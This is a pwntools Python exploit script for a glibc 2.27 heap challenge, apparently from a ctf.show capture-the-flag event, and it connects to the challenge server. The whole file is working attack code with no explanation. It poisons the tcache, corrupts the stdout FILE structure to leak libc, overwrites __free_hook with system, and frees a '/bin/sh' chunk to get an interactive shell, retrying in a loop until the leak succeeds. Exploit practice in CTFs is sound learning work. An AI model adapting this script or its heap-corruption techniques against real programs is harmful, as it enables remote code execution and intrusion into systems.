from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
elf = ELF("./pwn")
libc = ELF('/home/bit/libc/64bit/libc-2.27.so')
def Add(size, content):
        io.recvuntil("Choice:")
        io.sendline('1')
        io.recvuntil("Size?\n")
        io.sendline(str(size))
        io.recvuntil("Content?\n")
        io.send(content)
def Delete():
        io.recvuntil("Choice:")
        io.sendline('2')
def CTFshow():
        io.recvuntil("Choice:")
        io.sendline('1433233')
def pwn():
    Add(0x70,'a')
    Add(0,'')
    Add(0x100,'b')
    Add(0,'')
    Add(0xa0,'c')
    Add(0,'')
    
    Add(0x100,'b')
    [Delete() for i in range(7)] 
    Add(0,'') 
    Add(0x70,'a')
    Add(0x180,'c'*0x78+p64(0x41)+p8(0x60)+p8(0x87))
    Add(0,'')
    Add(0x100,'a')
    Add(0,'')
    Add(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))
    libc_base = u64(io.recvuntil("\x7f",timeout=0.1)[-6:].ljust(8,'\x00'))-0x3e8
    if libc_base == -0x3e82a0:
        exit(-1)
    print(hex(libc_base))
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    one_gadget = libc_base + 0x4f322
    io.sendline('1433233')
    Add(0x120,'a')
    Add(0,'')
    Add(0x130,'a')
    Add(0,'')
    Add(0x170,'a')
    Add(0,'')
    Add(0x130,'a')
    [Delete() for i in range(7)]
    Add(0,'')
    Add(0x120,'a')
    Add(0x260,'a'*0x128+p64(0x41)+p64(free_hook-8))
    Add(0,'')
    Add(0x130,'a')
    Add(0,'')
    Add(0x130,'/bin/sh\x00'+p64(system))
    Delete()
    io.interactive()
if __name__ == "__main__":
    while True:
        #io = process('./pwn')
        io = remote('pwn.challenge.ctf.show',28113)
        try:
            pwn()
        except:
            io.close()
